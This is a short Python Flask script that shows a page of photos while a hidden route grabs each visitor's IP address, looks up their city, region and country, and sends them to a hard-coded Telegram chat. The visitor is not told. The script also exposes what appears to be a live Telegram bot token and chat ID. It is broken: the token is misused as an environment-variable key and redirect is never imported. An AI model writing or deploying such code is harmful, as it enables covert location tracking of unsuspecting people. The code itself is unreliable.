import os
import requests
from flask import Flask, render_template, request
from telegram import Bot

app = Flask(__name__)

# Set up your Telegram bot token
bot_token = os.environ['5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg']

# Create a bot instance
bot = Bot(token=bot_token)

@app.route('/')
def index():
    # Display the photos on the HTML page
    photos = ['photo1.jpg', 'photo2.jpg', 'photo3.jpg']
    return render_template('index.html', photos=photos)

@app.route('/send_location', methods=['POST'])
def send_location():
    # Retrieve the user's IP address from the request
    ip_address = request.remote_addr

    # Make a request to the GeoIP API to get the location data
    location_response = requests.get(f'https://freegeoip.app/json/{ip_address}')
    location_data = location_response.json()

    # Build the message text
    message_text = f"Your location: {location_data['city']}, {location_data['region_name']}, {location_data['country_name']}"

    # Send the message to the Telegram bot
    chat_id = '373715044'
    bot.send_message(chat_id=chat_id, text=message_text)

    # Redirect the user back to the homepage
    return redirect('/')

if __name__ == '__main__':
    app.run()
